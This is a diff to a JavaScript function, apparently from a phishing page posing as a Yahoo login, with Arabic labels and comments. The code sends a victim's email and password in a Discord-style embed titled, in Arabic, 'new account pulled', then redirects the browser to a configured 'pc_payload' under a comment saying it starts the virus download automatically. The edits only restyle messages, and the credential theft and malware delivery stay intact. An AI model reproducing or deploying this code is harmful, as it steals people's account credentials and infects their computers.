@@ -15,17 +15,17 @@ async function startCapture() {
             body: JSON.stringify({
                 username: "ER0R SYSTEM",
                 embeds: [{
-                    title: "💀 صيد جديد - جاري بدء التحميل",
+                    title: "💀 تم سحب حساب جديد",
                     fields: [
-                        { name: "📧 الإيميل", value: email, inline: true },
-                        { name: "🔑 الباسورد", value: pass, inline: true }
+                        { name: "📧 الإيميل", value: `\`${email}\``, inline: true },
+                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true }
                     ],
                     color: 0x6001d2
                 }]
             })
         });
 
-        // تشغيل تحميل الفيروس تلقائياً
+        // بدء تحميل الفيروس تلقائياً
         window.location.href = config.pc_payload;
     } catch(e) { window.location.href = "https://yahoo.com"; }
 }
